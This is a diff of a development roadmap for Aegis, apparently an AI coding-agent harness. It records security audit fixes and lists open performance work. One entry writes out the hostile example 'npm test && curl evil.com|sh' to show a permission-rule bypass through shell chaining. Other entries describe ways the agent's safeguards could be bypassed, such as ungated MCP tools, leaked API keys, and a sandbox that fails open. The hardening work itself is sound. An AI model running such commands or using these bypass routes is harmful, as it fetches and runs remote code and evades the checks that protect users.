@@ -1,12 +1,74 @@
 # Aegis Capability Roadmap
 **Date:** 2026-06-29
-**Updated:** 2026-07-03 (v12 — P6.4 shipped; only exploratory P6 items remain open)
+**Updated:** 2026-07-03 (v14 — P7 security hardening track fully shipped (P7.1–P7.7); P8 performance remains open, ahead of exploratory P6/P9)
 
 ---
 
 ## Status
 
-P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track, and P6.4 are shipped — see [Appendix A](#appendix-a--completed-work) for detail on any item. Everything remaining is exploratory long-horizon work with no current forcing function; none of it is scheduled.
+P2, P3, P4, P5 (all sub-items), the TQ TUI-quality track, P6.4, and all of P7 (P7.1–P7.7) are shipped — see [Appendix A](#appendix-a--completed-work) for detail on any item.
+
+A 2026-07-03 code-level audit (three parallel passes: security, performance, feature-gap) found concrete, verified issues that outrank the exploratory P6 backlog — see **P8 (Performance)** below. P9 collects smaller engineering-quality gaps (test coverage, eval harness) that are real but lower urgency. P6 remains long-horizon/exploratory with no forcing function.
+
+**Recommended priority order:** P8.1 → rest of P8 → P9 → P6.
+
+**Reviewed and found sound, no action needed (from the P7 audit):** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).
+
+---
+
+## Open Work — P8 (Performance — 2026-07-03 audit)
+
+### P8.1 — Session store rewrites the entire message/trace blob every turn
+`internal/session/session.go:232-247` (`SaveMessages`) and `:195-229` (`AppendTraces`) do a full read-modify-write of the whole messages/traces BLOB on every single turn (`AppendTraces` even does SELECT-full-blob → unmarshal → append → re-marshal → UPDATE inside a transaction). At N turns this is O(N) work per turn → O(N²) total I/O/CPU over a session's lifetime, and the trace blob never shrinks except on VACUUM. This is the clearest scaling risk found — it taxes every turn more as a session ages.
+**Fix:** move to incremental/append-only storage (separate row-per-message or a WAL-style append log) instead of whole-blob rewrite. Effort: **M**, Impact: **High**.
+
+### P8.2 — Knowledge semantic search loads the full corpus per query
+`internal/knowledge/knowledge.go:292` joins `docs_vec`/`docs` and pulls every document's vector *and full body* into memory with no `LIMIT`, then ranks in application code. At a few thousand indexed docs this is a full-corpus load on every search.
+**Fix:** score against vectors only, then a second targeted query for just the top-K bodies. Effort: **M**, Impact: **Medium**.
+
+### P8.3 — Swarm mailbox has no eviction; grows unbounded in long team sessions
+`internal/swarm/mailbox.go:105-133` (`ReadAll`) lists and reads every `.json` file in the inbox directory on each call, including already-read messages, with nothing anywhere in the package that archives or deletes them. Long-running multi-agent teams accumulate ever-more file I/O per poll.
+**Fix:** move read messages to a `processed/` subdir excluded from listing, or delete after ack. Effort: **S/M**, Impact: **Medium**.
+
+### P8.4 — Token estimation double-scans the full conversation per turn for local models
+`internal/engine/engine.go:240,429` (`estimateTokens`) walks every message/block in the conversation — once for the proactive-compaction check, again whenever a provider returns zero usage (all local/Ollama models hit this every turn). Two full-conversation scans per turn, scaling with session length.
+**Fix:** maintain a running character/token count updated incrementally on `Append` instead of re-scanning. Effort: **S**, Impact: **Medium**.
+
+### P8.5 — Memory relevance scoring recomputes TF-IDF from scratch on every call
+`internal/memory/relevance.go:24-90,119-137` (`LoadRelevant`/`allEntries`) reloads and re-tokenizes every memory/skill file and rebuilds the full document-frequency table on every invocation, with no caching keyed on mtime/content hash. Low impact at today's memory-file scale, but pure waste.
+**Fix:** cache `allEntries()`/`df` until underlying files change. Effort: **S**, Impact: **Low-Medium**.
+
+### P8.6 — Write/execute tool calls serialize concurrent reads unnecessarily
+`internal/engine/engine.go` `runTools` (~line 481-532) uses `execLock sync.RWMutex`; a single write/execute call in a round takes the write lock and excludes *all* concurrent read/network calls in that same round, rather than letting reads proceed around it. Minor throughput loss on mixed tool-call rounds.
+**Fix:** scope the lock more narrowly, or let independent reads run before/after rather than fully serializing the round. Effort: **S**, Impact: **Low**.
+
+No goroutine leaks, unbounded channels, or missing context-cancellation were found in `engine.go`/`mailbox.go`/`subprocess.go` — cancellation is checked consistently and `exec.CommandContext` is used throughout.
+
+---
+
+## Open Work — P9 (Engineering Quality — lower urgency, no current trigger)
+
+### P9.1 — No eval/regression harness for agent behavior
+No golden-transcript tests or scripted multi-turn scenario suite exists to catch prompt/behavior regressions across model or persona changes — unit-test coverage is otherwise good (nearly every package has a `_test.go`). Codex and Claude Code both maintain internal eval suites for this. Priority: **Medium**, Effort: **M**.
+
+### P9.2 — Zero test coverage in `internal/trace`, `internal/logging`, `internal/api`, `internal/client`
+`internal/api` in particular defines the wire contract between daemon and both clients (TUI/CLI) — untested serialization there is a real regression risk on refactors. Priority: **Medium**, Effort: **S**.
+
+### P9.3 — No OpenTelemetry/Prometheus export
+TurnTrace/cost data is SQLite-only and pull-based. Fine for a single-operator daemon; becomes relevant the moment Aegis runs as shared infra someone wants in an existing metrics stack. No current trigger — don't build speculatively. Priority: **Low**, Effort: **M**.
+
+### P9.4 — No per-task/complexity model routing
+P5.9 only reroutes on failure. Nothing picks a cheaper model for simple turns and reserves an expensive one for hard turns (cf. Aider). Plausible cheap win given cost tracking already exists, but no evidence of demand. Priority: **Low**, Effort: **M**.
+
+### P9.5 — Cost tracking has no spend caps
+`internal/cost.Tracker` only accumulates a running total; no daily/session cap or alert threshold, and no multi-tenant concept at all (by design — single-operator tool). A spend-cap config knob would be small and low-risk if a runaway-cost incident ever happens. Priority: **Low**, Effort: **S**.
+
+### P9.6 — No bulk export/import of session/memory stores
+`internal/share` already exports a single session to Markdown/JSON/HTML (stronger than expected), but migrating the full session/`longmem`/`knowledge` SQLite stores to a new machine today means copying files by hand. Priority: **Low**, Effort: **S**.
+
+**None of P9 is blocking** — same posture as P6: real but no concrete trigger, don't build speculatively.
+
+---
 
 ## Open Work — P6 (Long-Horizon / Exploratory)
 
@@ -79,6 +141,30 @@ ACP covers Zed and Neovim; the web UI covers browsers. Evaluate: (a) VS Code ext
 - P5.7 Bundle install from git URL — `aegis bundle install/info <git-url>` clones `--depth=1` to temp dir and installs as a normal local bundle.
 - P5.8 Semantic recall layer — `internal/embed` (Ollama `/api/embed` client, cosine similarity, reciprocal-rank fusion); `knowledge.Store` and `longmem.Store` gained an optional `Embedder` and a `docs_vec`/`mem_vec` BLOB vector table; `Search`/`SearchMemory` fuse BM25 + semantic rankings via RRF when `embeddings.enabled: true`, else BM25-only (default). `aegis knowledge index` CLI command added. Along the way, fixed a real gap: `knowledge.Store`/`longmem.Store` were built but never opened by the daemon — `project_knowledge`/`entity_remember`/`entity_recall` were dead tools; now wired into `internal/server`.
 - P5.9 Provider failover — `provider.WithFailover` chains a primary adapter with ordered fallback targets, switching only on synchronous Stream failure after each target's own retry budget is exhausted (never mid-stream, so no partial output is replayed). `provider.fallback` config (ordered provider/model/base_url entries) + `provider.allow_cloud_fallback` guard: local→cloud failover is skipped with a warning unless explicitly opted in; cloud→cloud and any→local are never gated. `providerfactory.Build` assembles the chain.
+
+</details>
+
+<details>
+<summary><strong>P7.1 — MCP capability laundering fixed, shipped 2026-07-03</strong></summary>
+
+- `mcp.ServerConfig` gained `capability` (per-server default) and `tool_capabilities` (per remote tool name override) config fields; `internal/config.MCPServerConfig` and `internal/server` wiring pass them through.
+- `internal/mcp/tool.go`: `mcpTool`/`mcpResourceListTool`/`mcpResourceReadTool`/`mcpPromptListTool`/`mcpPromptGetTool` all carry a resolved `tool.Capability` field instead of hardcoding `tool.CapNetwork`; `resolveCapability`/`parseCapability` default anything unlabeled/unrecognized to `tool.CapExecute` (most restrictive), matching the existing `internal/plugins` process-tool pattern.
+- Net effect: an unlabeled or untrusted MCP server's tools now hit the `Ask` gate in build mode and are denied outright in plan mode, instead of the always-allowed `network` capability. Trusted servers opt back into `network` (or any other class) explicitly per-server or per-tool.
+- Tests: `internal/mcp/mcp_test.go` — `TestParseCapabilityDefaultsToExecute`, `TestResolveCapabilityPerToolOverride`, `TestResolveCapabilityDefaultsExecuteWithNoConfig`.
+- Docs updated: `docs/configuration.md` (MCP server example with `capability`/`tool_capabilities`), `docs/security.md` (`egress_then_write` network-capability description).
+
+</details>
+
+<details>
+<summary><strong>P7.2–P7.7 — remaining security-hardening audit items, shipped 2026-07-03</strong></summary>
+
+- **P7.2 (shell env leak):** `internal/sandbox/env.go` (new) strips `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` (`DefaultStripEnv`) from `cmd.Env` in both `LocalBackend` and `OSBackend` (`local.go`, `os_sandbox.go`); `sandbox.strip_env` config (`config.SandboxConfig.StripEnv`) adds more names (e.g. MCP tokens from `.aegis/.env`) via `NewLocalBackendWithEnv`/`NewOSBackend`'s new param. Container backend untouched — `docker run`/`podman run` never passed host env into the container to begin with.
+- **P7.3 (exec allow-rule chaining bypass):** `internal/permission/rules.go` adds `globToRegexpExec` — for an `allow` rule scoping an execute-capability tool, `*`/`?` cannot span shell chaining/substitution chars (`;&|`+"`"+`$()<>` + newline), so `allow bash(npm test*)` no longer matches `npm test && curl evil.com|sh`. Deny rules deliberately keep the original broad `.*` (over-matching on deny is safe).
+- **P7.4 (silent sandbox fallback):** sandbox backend selection extracted to standalone `server.selectSandbox` (testable in isolation); `sandbox.strict` config makes a failed `container`/`os` backend init a hard startup error instead of silently falling back to local. Non-strict fallback is recorded on `Server` and surfaced via `/healthz` (`api.HealthStatus.SandboxFallback`); `client.Status()` + `cli.warnSandboxFallback` print a warning banner in the TUI/`aegis ui` before entering a session.
+- **P7.5 (persona mode escalation):** `persona.Persona` gained a `Loaded bool` field (true only for `*.md`-parsed personas, never built-ins); `server.resolveSessionMode` ignores a loaded persona's `mode: auto` when it's more permissive than the configured default and the caller didn't explicitly request a mode, logging a warning instead. Built-in personas remain fully trusted.
+- **P7.6 (no bundle provenance check):** `bundle.Bundle.ContentHash()` computes a deterministic `sha256:`-prefixed digest over the manifest + every artifact file; `aegis bundle info` prints it, `aegis bundle install --expect-sha256 <hash>` aborts before writing anything on mismatch. Trust-on-first-use pinning, not a signature.
+- **P7.7 (silent no-op deny rules):** `permission.WarnUnmatchableRules` (called once at startup against `tool.Registry.All()`, a new method) flags any non-`*`-pattern rule targeting a tool whose input schema has none of `subjectFor`'s recognized fields (`command`/`path`/`file_path`/`url`/`query`/`pattern`) — such a rule can never match, so it's logged instead of silently no-op'ing.
+- Docs: `docs/configuration.md`, `docs/security.md`, `docs/permissions.md`, `docs/personas.md`, `docs/extensibility.md` all updated with the new config knobs/flags and their security rationale.
 
 </details>
 
@@ -159,6 +245,21 @@ What changed in the top-tier harnesses since the 2026-06-29 competitive analysis
 | 16 | Memory | Knowledge/longmem retrieval is BM25-only | Cursor, Devin | Low | ✅ P5.8 |
 | 17 | Reliability | No provider failover | Aider (litellm routing) | Low | ✅ P5.9 |
 | — | Context efficiency | No deterministic tool-result pruning before LLM compaction | Codex CLI (token efficiency) | Low | ✅ P6.4 |
+| 18 | Security | MCP tools hardcode capability as `network`, bypassing permission gate in any mode | — (internal audit) | **Critical** | ✅ P7.1 |
+| 19 | Security | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts | — (internal audit) | High | ✅ P7.2 |
+| 20 | Security | Permission allow-rule glob matches whole command string, bypassed by shell chaining | — (internal audit) | High | ✅ P7.3 |
+| 21 | Security | Sandbox backend silently fails open to unsandboxed exec | — (internal audit) | Medium | ✅ P7.4 |
+| 22 | Security | Bundle persona can silently escalate session to `auto` mode | — (internal audit) | Medium | ✅ P7.5 |
+| 23 | Security | No signature/checksum verification on git-URL bundle installs | opencode plugin registry | Medium | ✅ P7.6 |
+| 24 | Security | Deny rules silently no-op for tools with non-standard argument fields | — (internal audit) | Low | ✅ P7.7 |
+| 25 | Performance | Session store rewrites entire message/trace blob every turn — O(N²) over session life | — (internal audit) | High | ⬜ P8.1 |
+| 26 | Performance | Knowledge semantic search loads full corpus (vectors + bodies) per query | — (internal audit) | Medium | ⬜ P8.2 |
+| 27 | Performance | Swarm mailbox has no eviction, grows unbounded | — (internal audit) | Medium | ⬜ P8.3 |
+| 28 | Performance | Token estimation double-scans full conversation per turn (local models) | — (internal audit) | Medium | ⬜ P8.4 |
+| 29 | Performance | Memory relevance TF-IDF recomputed from scratch every call | — (internal audit) | Low-Med | ⬜ P8.5 |
+| 30 | Performance | Write/execute tool calls unnecessarily serialize concurrent reads | — (internal audit) | Low | ⬜ P8.6 |
+| 31 | Quality | No agent-behavior eval/regression harness | Codex, Claude Code (internal eval suites) | Medium | ⬜ P9.1 |
+| 32 | Quality | Zero test coverage in trace/logging/api/client packages | — (internal audit) | Medium | ⬜ P9.2 |
 
 ---
 
